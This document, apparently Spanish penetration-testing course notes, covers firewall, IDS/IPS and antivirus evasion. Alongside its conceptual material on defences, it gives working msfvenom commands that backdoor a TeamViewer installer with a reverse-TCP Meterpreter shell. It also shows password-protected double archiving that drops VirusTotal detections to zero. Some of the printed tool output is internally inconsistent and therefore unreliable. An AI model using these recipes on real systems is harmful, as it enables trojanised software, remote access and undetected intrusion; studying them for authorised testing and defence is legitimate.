# Evasión de Firewalls e IDS/IPS

## Fundamentos de Defensa en Profundidad

Para atacar eficientemente y de manera sigilosa, primero debemos comprender cómo está defendido el objetivo. El modelo de seguridad moderno se divide en dos categorías principales de protección:

### Endpoint Protection (Protección de Punto Final)

**Definición**: Protección localizada en dispositivos o servicios cuyo único propósito es proteger un **host individual** en la red.

**Tipos de hosts protegidos:**
- Computadoras personales
- Estaciones de trabajo corporativas
- Servidores en la De-Militarized Zone (DMZ)

**Componentes típicos de Endpoint Protection:**

Los paquetes de software modernos incluyen múltiples capas de protección en una sola suite:

1. **Antivirus Protection**: Detección de virus tradicionales
2. **Antimalware Protection**: Protección contra:
   - Bloatware (software innecesario)
   - Spyware (software espía)
   - Adware (software publicitario)
   - Scareware (software de intimidación)
   - Ransomware (software de secuestro de datos)
3. **Firewall local**: Control de tráfico entrante/saliente
4. **Anti-DDoS**: Protección contra ataques de denegación de servicio

**Ejemplos comerciales populares:**
- Avast
- ESET NOD32
- Malwarebytes
- BitDefender
- Kaspersky
- Windows Defender

Esta forma de protección es la más familiar para la mayoría de usuarios, ya que se ejecuta directamente en PCs domésticos y estaciones de trabajo corporativas.

### Perimeter Protection (Protección de Perímetro)

**Definición**: Dispositivos físicos o virtualizados ubicados en el **borde del perímetro de la red**.

**Función principal**: Proporcionar acceso controlado desde el exterior de la red hacia el interior, es decir, desde zonas públicas a zonas privadas.

#### Modelo de Zonas de Seguridad

**Zona Externa (Outside Zone):**
- El vasto Internet público
- Nivel de confianza: **Ninguno**
- Política de seguridad: Más restrictiva

**Zona DMZ (De-Militarized Zone):**
- Zona intermedia entre exterior e interior
- Nivel de confianza: **Bajo** (mayor que exterior, menor que interior)
- Política de seguridad: **Intermedia**

**Propósito de la DMZ:**
- Albergar servidores de cara pública
- Permitir que servidores:
  - **Empujen** (push) datos hacia clientes públicos
  - **Extraigan** (pull) datos de clientes públicos
  - Sean **gestionados** desde la red interna
  - Reciban **actualizaciones** y **parches** desde el interior

**Ejemplos de servicios en DMZ:**
- Servidores web públicos
- Servidores de correo (SMTP)
- Servidores DNS externos
- Proxies reversos

**Zona Interna (Inside Zone):**
- Red corporativa privada
- Nivel de confianza: **Alto**
- Política de seguridad: Más permisiva (entre recursos internos)

## Security Policies (Políticas de Seguridad)

### Concepto Fundamental

Las políticas de seguridad son el **motor detrás de toda postura de seguridad** bien mantenida en cualquier red.

**Similitud con ACLs de Cisco**: Para quienes están familiarizados con material educativo CCNA, las políticas de seguridad funcionan de manera idéntica a las Access Control Lists (ACLs).

### Estructura de Políticas

**Principio básico**: Listas de declaraciones **allow** (permitir) y **deny** (denegar) que dictan:
- Cómo puede existir el tráfico dentro de los límites de la red
- Qué archivos pueden ser procesados
- Qué acciones pueden ejecutarse

**Flexibilidad**: Múltiples listas pueden actuar sobre diferentes partes de la red, permitiendo configuraciones granulares.

### Tipos de Políticas de Seguridad

Las políticas pueden enfocarse en diferentes aspectos de la red y hosts:

1. **Network Traffic Policies** (Políticas de Tráfico de Red)
   - Control de flujo de paquetes
   - Filtrado por puerto, protocolo, dirección IP

2. **Application Policies** (Políticas de Aplicaciones)
   - Qué aplicaciones pueden ejecutarse
   - Permisos de aplicaciones específicas

3. **User Access Control Policies** (Políticas de Control de Acceso de Usuarios)
   - Autenticación y autorización
   - Privilegios por rol

4. **File Management Policies** (Políticas de Gestión de Archivos)
   - Qué archivos pueden ser creados, modificados, eliminados
   - Restricciones por tipo de archivo

5. **DDoS Protection Policies** (Políticas de Protección DDoS)
   - Umbrales de tráfico
   - Patrones de ataque conocidos

**Nota importante**: Aunque no todas estas categorías tengan "Security Policy" en su nombre, todos los mecanismos de seguridad operan bajo el mismo principio fundamental de **allow/deny**.

## Métodos de Detección y Matching

### Pregunta Clave

¿Cómo emparejamos eventos en la red con estas reglas para que las acciones apropiadas puedan ejecutarse?

### Métodos de Detección

| Método | Descripción | Funcionamiento |
|--------|-------------|----------------|
| **Signature-based Detection** | Detección basada en firmas | Operación de paquetes en la red y comparación con patrones de ataque pre-construidos conocidos como firmas. Cualquier coincidencia 100% genera alarmas. |
| **Heuristic / Statistical Anomaly Detection** | Detección heurística / Detección de anomalías estadísticas | Comparación de comportamiento contra una línea base establecida que incluye firmas de modus-operandi para APTs conocidos (Advanced Persistent Threats). La línea base identifica la norma para la red y qué protocolos se usan comúnmente. Cualquier desviación del umbral máximo genera alarmas. |
| **Stateful Protocol Analysis Detection** | Detección de análisis de protocolo con estado | Reconocimiento de divergencia de protocolos mediante comparación de eventos usando perfiles pre-construidos de definiciones generalmente aceptadas de actividad no maliciosa. |
| **Live-monitoring and Alerting (SOC-based)** | Monitoreo en vivo y alertas basadas en SOC | Un equipo de analistas en un SOC dedicado (in-house o arrendado) usa software de feed en vivo para monitorear actividad de red y sistemas de alerta intermedios para cualquier amenaza potencial, decidiendo ellos mismos si la amenaza debe ser accionada o permitiendo que mecanismos automatizados tomen acción. |

### Detección Basada en Firmas: Funcionamiento Detallado

**Aplicación en Antivirus moderno:**

La mayoría de software antivirus basado en host depende principalmente de **Signature-based Detection** para identificar aspectos de código malicioso en muestras de software.

**Proceso:**

1. **Firmas almacenadas**: Se colocan dentro del **Antivirus Engine**
2. **Escaneo**: Se usan para escanear:
   - Espacio de almacenamiento (disco)
   - Procesos en ejecución (memoria)
3. **Matching**: Cuando software desconocido aterriza en una partición y es emparejado por el AV
4. **Acción**: La mayoría de antivirus:
   - **Cuarentenan** el programa malicioso
   - **Matan** el proceso en ejecución

## Técnicas de Evasión

### Contexto: La Insuficiencia de la Codificación Simple

Como se demostró en la sección de Encoders, **simplemente codificar payloads** usando diferentes esquemas de codificación con múltiples iteraciones **NO es suficiente** para todos los productos AV.

**Problema adicional**: Meramente establecer un canal de comunicación entre atacante y víctima puede generar alarmas con las capacidades actuales de productos IDS/IPS.

### Cifrado AES en MSF6

**Mejora significativa**: Con el lanzamiento de MSF6, `msfconsole` puede tunelizar comunicación **cifrada con AES** desde cualquier shell Meterpreter de vuelta al host atacante.

**Ventajas:**
- Cifra el tráfico mientras el payload se envía al host víctima
- Se encarga principalmente de IDS/IPS basados en red
- Protege contra inspección de paquetes no cifrados

### Evasión de Rulesets Estrictos

**Escenario problemático**: En casos raros, podemos encontrar rulesets de tráfico muy estrictos que marcan nuestra conexión basándose en la **dirección IP del remitente**.

**Solución**: Encontrar servicios que estén siendo permitidos a través de los filtros.

#### Caso de Estudio: Equifax Hack 2017

**Vector de ataque:**
1. Explotación de vulnerabilidad Apache Struts
2. Acceso a red de servidores de datos críticos
3. Uso de **técnicas de exfiltración DNS**
4. Extracción lenta de datos sin ser detectados durante meses

**Técnica clave**: Exfiltración DNS

DNS es comúnmente permitido a través de firewalls ya que es esencial para operaciones de red. Los atacantes abusaron de esto para:
- Empaquetar datos dentro de queries DNS
- Enviar información hacia dominios controlados por los atacantes
- Evitar detección por análisis de tráfico tradicional

**Recursos para profundizar:**

- [US Government Post-Mortem Report on the Equifax Hack](https://www.oig.doc.gov/OIGPublications/OIG-18-002-A.pdf)
- [Protecting from DNS Exfiltration](https://www.infoblox.com/dns-security-resource-center/dns-security-issues-threats/dns-exfiltration/)
- [Stopping Data Exfil and Malware Spread through DNS](https://www.cisco.com/c/en/us/products/security/dns-security.html)

### Capacidades Mejoradas de Meterpreter

**Combinación poderosa:**
1. **Túneles cifrados con AES** de `msfconsole`
2. **Ejecución en memoria** de Meterpreter

**Resultado**: Aumento significativo de capacidades de evasión.

### Problema Persistente: Detección en Disco

**Escenario**: Antes de que el payload se ejecute y se coloque en memoria, el archivo puede ser:
1. **Fingerprinted** (obtención de huella digital) por su firma
2. **Emparejado** contra la base de datos de AV
3. **Bloqueado** junto con nuestras posibilidades de acceso

**Realidad del desarrollo de AV:**

Los desarrolladores de software AV están constantemente:
- Analizando módulos y capacidades de `msfconsole`
- Agregando código resultante y archivos a sus bases de datos de firmas
- **Resultado**: La mayoría, si no todos, los payloads predeterminados son inmediatamente bloqueados por software AV moderno

## Executable Templates: Backdoored Executables

### Concepto de Templates

**Solución de msfvenom**: Ofrece la opción de usar **executable templates** (plantillas de ejecutables).

**Proceso:**

1. Usar plantillas pre-establecidas para archivos ejecutables
2. **Inyectar** nuestro payload dentro de ellas
3. Usar cualquier ejecutable como plataforma de lanzamiento

**Ventaja clave**: Podemos **embeber el shellcode** dentro de cualquier:
- Instalador
- Paquete
- Programa legítimo

**Resultado**: El código de payload queda oculto profundamente dentro del código legítimo del producto real.

### Beneficios de la Ofuscación

**Ofuscación significativa:**
- El código malicioso está mezclado con código legítimo
- Más difícil de identificar mediante análisis estático

**Reducción de detección:**
- Combinaciones válidas entre:
  - Archivos ejecutables legítimos reales
  - Diferentes esquemas de codificación (y sus iteraciones)
  - Diferentes variantes de shellcode de payload

**Resultado final**: Generación de un **backdoored executable** (ejecutable con backdoor).

### Creación de Backdoored Executable con msfvenom

**Comando completo:**

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
```

**Desglose de parámetros:**

- **windows/x86/meterpreter_reverse_tcp**: Payload base
- **LHOST=10.10.14.2**: IP del atacante
- **LPORT=8080**: Puerto del atacante
- **-k**: Keep (mantener ejecución del template original)
- **-x ~/Downloads/TeamViewer_Setup.exe**: Template ejecutable (archivo legítimo)
- **-e x86/shikata_ga_nai**: Encoder a utilizar
- **-a x86**: Arquitectura objetivo
- **--platform windows**: Plataforma objetivo
- **-o ~/Desktop/TeamViewer_Setup.exe**: Archivo de salida
- **-i 5**: Iteraciones de encoding (5 veces)

**Salida del comando:**

```
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
```

**Análisis del proceso:**
- Cada iteración de encoding aumenta el tamaño del payload
- Iteración 0: 27 bytes
- Iteración 4 (final): 135 bytes
- Tamaño final del shellcode: 135 bytes (antes de embedirse en el template)

### Flag -k: Keep Template Execution

**Problema sin -k**: Cuando el objetivo lanza un ejecutable backdooreado, **nada parece suceder**, lo cual puede generar sospechas.

**Solución con -k**: El flag **-k** (keep) hace que:
1. El payload se ejecute en un **thread separado**
2. La **ejecución normal** de la aplicación continúe
3. El usuario vea la aplicación funcionar normalmente

**Limitación importante**: Incluso con el flag **-k**, el objetivo **notará** el backdoor si:
- Lanzan el ejecutable desde un **entorno CLI** (línea de comandos)
- Una **ventana separada** aparecerá con el payload
- Esta ventana **no se cerrará** hasta que finalicemos la interacción de la sesión

**Conclusión**: Lanzar backdoored executables desde GUI (doble clic) es más sigiloso que desde CLI.

## Archiving: Evasión mediante Archivos Comprimidos

### Técnica de Archiving Passworded

**Método**: Archivar información (archivo, carpeta, script, ejecutable, imagen, documento) y colocar una **contraseña** en el archivo comprimido.

**Efectividad**: Bypasea **muchas** firmas antivirus comunes actualmente.

**Desventaja**: Los archivos:
- Se **marcan como notificaciones** en el dashboard de alarmas del AV
- Indican que **no pueden ser escaneados** debido a estar bloqueados con contraseña
- Un administrador puede elegir **inspeccionar manualmente** estos archivos para determinar si son maliciosos

### Proceso Completo de Double-Archiving

#### Paso 1: Generar Payload Base

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

**Salida:**
```
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
```

**Verificación del payload crudo:**

```bash
cat test.js
```

**Contenido (binario no legible):**
```
�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\�=;.l�T���XF���T��
```

#### Paso 2: Test Inicial en VirusTotal

```bash
msf-virustotal -k <API key> -f test.js
```

**Resultado**: **11/59 detecciones**

**Motores que detectaron:**
- ALYac: `Exploit.Metacoder.Shikata.Gen`
- AVG: `Win32:ShikataGaNai-A [Trj]`
- Ad-Aware: `Exploit.Metacoder.Shikata.Gen`
- Avast: `Win32:ShikataGaNai-A [Trj]`
- BitDefender: `Exploit.Metacoder.Shikata.Gen`
- ClamAV: `Win.Trojan.MSShellcode-6360729-0`
- Emsisoft: `Exploit.Metacoder.Shikata.Gen (B)`
- FireEye: `Exploit.Metacoder.Shikata.Gen`
- GData: `Exploit.Metacoder.Shikata.Gen`
- MicroWorld-eScan: `Exploit.Metacoder.Shikata.Gen`
- MAX: `malware (ai score=89)`

**Observación importante**: Varios AV identifican específicamente el encoder **Shikata Ga Nai** por nombre.

#### Paso 3: Instalación de RAR Utility

```bash
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```

#### Paso 4: Primera Capa de Archiving

```bash
rar a ~/test.rar -p ~/test.js
```

**Interacción:**
```
Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

**Verificación:**
```bash
ls
```

**Salida:**
```
test.js   test.rar
```

#### Paso 5: Remover Extensión .RAR

```bash
mv test.rar test
ls
```

**Salida:**
```
test   test.js
```

**Propósito**: Archivo sin extensión es menos sospechoso y puede evadir filtros basados en extensiones.

#### Paso 6: Segunda Capa de Archiving

```bash
rar a test2.rar -p test
```

**Interacción:**
```
Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```

#### Paso 7: Remover Extensión Final

```bash
mv test2.rar test2
ls
```

**Salida:**
```
test   test2   test.js
```

**Resultado final**: `test2` es el archivo RAR final con la extensión eliminada, conteniendo dos capas de archivos comprimidos con contraseña.

#### Paso 8: Test Final en VirusTotal

```bash
msf-virustotal -k <API key> -f test2
```

**Resultado**: **0/49 detecciones** ✓

**Todos los motores reportan:**
```
Detected: false
```

**Análisis del éxito:**

La técnica de double-archiving con contraseñas:
1. **Primera capa**: Previene escaneo directo del payload
2. **Segunda capa**: Añade ofuscación adicional
3. **Sin extensiones**: Evita filtros basados en tipo de archivo
4. **Resultado**: 0% de detección vs 18.6% original

**Conclusión**: Esta es una **excelente manera** de transferir datos tanto hacia como desde el host objetivo sin ser detectado.

## Packers (Empaquetadores)

### Definición y Funcionamiento

**Packer**: Resultado de un proceso de compresión de ejecutables donde:
- El payload se **empaqueta** junto con un programa ejecutable
- Se incluye el **código de descompresión**
- Todo en **un solo archivo**

### Proceso de Ejecución

**Cuando se ejecuta:**

1. El código de descompresión se activa
2. Retorna el ejecutable backdooreado a su **estado original**
3. Proceso transparente para el usuario
4. El ejecutable se comporta **idénticamente** al original
5. Retiene **toda la funcionalidad** original

**Ventaja adicional**: `msfvenom` proporciona capacidad para:
- Comprimir ejecutables backdooreados
- Cambiar la **estructura de archivo**
- **Cifrar** la estructura del proceso subyacente

### Software Packer Popular

| Categoría | Herramientas |
|-----------|--------------|
| **Open Source** | UPX packer, MEW |
| **Comercial** | The Enigma Protector, Themida |
| **Especializados** | MPRESS, Alternate EXE Packer, ExeStealth, Morphine |

### Recursos para Profundizar

Para aprender más sobre packers, consultar el proyecto [PolyPack](https://jon.oberheide.org/files/woot09-polypack.pdf).

## Exploit Coding: Evasión a Nivel de Código

### Randomización de Patrones

**Problema**: Un típico exploit de Buffer Overflow puede ser fácilmente distinguido del tráfico regular debido a sus **patrones de buffer hexadecimales**.

**Detección por IDS/IPS**:
- Chequean tráfico hacia la máquina objetivo
- Notan **patrones sobre-utilizados** para código de explotación
- Bases de datos de firmas para buffers de exploits conocidos

### Solución: Offset Randomization

**Implementación en módulo msfconsole:**

```ruby
'Targets' =>
[
    [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

**Efecto**:
- Agrega **variación** a los patrones
- Rompe las firmas de base de datos IPS/IDS
- Hace que buffers de exploits conocidos sean más difíciles de detectar

### Evasión de NOP Sleds

**Concepto de NOP Sled**:
- **NOP (No Operation)**: Instrucción que no hace nada
- **Sled**: Serie larga de instrucciones NOP
- **Propósito**: Proporcionar área de aterrizaje amplia para shellcode después de overflow

**Problema**: IPS/IDS entidades regularmente chequean:
1. Código de BoF (Buffer Overflow)
2. NOP sleds obvios

**Solución**: Evitar usar NOP sleds obvios donde el shellcode debería aterrizar después de completar el overflow.

### Diferencia entre BoF Code y NOP Sled

**BoF Code (Buffer Overflow Code):**
- **Propósito**: Crashear el servicio corriendo en la máquina objetivo
- Sobrescribe memoria para ganar control del flujo de ejecución

**NOP Sled:**
- **Propósito**: Memoria asignada donde nuestro shellcode (el payload) es insertado
- Facilita que el EIP "resbale" hacia el payload sin importar dónde aterrice exactamente

### Testing en Sandbox

**Recomendación crítica**: Probar código de exploit personalizado contra un **ambiente sandbox** antes de desplegarlo en la red del cliente.

**Razón**: Podríamos tener **solo una oportunidad** para hacerlo correctamente durante una evaluación.

### Recursos para Exploit Coding

Para información detallada sobre codificación de exploits:
- [Metasploit - The Penetration Tester's Guide](https://nostarch.com/metasploit) - No Starch Press

El libro profundiza en detalles sobre creación de exploits personalizados para el Framework.

## Resumen de Defensas Comunes

**IPS/IDS y Motores Antivirus** son las herramientas defensoras más comunes que pueden derribar un foothold inicial en el objetivo.

**Funcionamiento principal:**
- **Firmas** del archivo malicioso completo
- **Firmas** del stub stage (etapa inicial del payload)

## Nota sobre Evasión

### Alcance de Esta Sección

Esta sección cubre evasión a **alto nivel**. El tema es vasto y no puede cubrirse adecuadamente en una sola sección.

### Módulos Futuros

**Expectativa**: Módulos posteriores profundizarán en:
- Teoría de evasión más detallada
- Conocimiento práctico necesario para evasión efectiva
- Técnicas avanzadas de bypass

### Práctica Recomendada

**Sugerencias para práctica:**

1. **HTB Machines antiguas**: Probar técnicas en máquinas más viejas de HackTheBox
2. **VMs con AV legacy**: Instalar máquinas virtuales con:
   - Versiones antiguas de Windows Defender
   - Motores de AV gratuitos
3. **Desarrollo de habilidades**: Practicar evasión en ambientes controlados

**Conclusión**: La evasión es un tema **vasto** que requiere estudio y práctica continua para dominarse efectivamente.

## Referencias

- [US Government Post-Mortem Report on the Equifax Hack](https://www.oig.doc.gov/OIGPublications/OIG-18-002-A.pdf)
- [Protecting from DNS Exfiltration](https://www.infoblox.com/dns-security-resource-center/dns-security-issues-threats/dns-exfiltration/)
- [Stopping Data Exfil and Malware Spread through DNS](https://www.cisco.com/c/en/us/products/security/dns-security.html)
- [PolyPack Project](https://jon.oberheide.org/files/woot09-polypack.pdf)
- [Metasploit: The Penetration Tester's Guide](https://nostarch.com/metasploit)

---

La evasión de sistemas de detección es un juego constante de gato y ratón entre atacantes y defensores. Las técnicas presentadas aquí representan fundamentos sólidos, pero la evolución continua de defensas requiere aprendizaje y adaptación constante por parte de los pentesters.
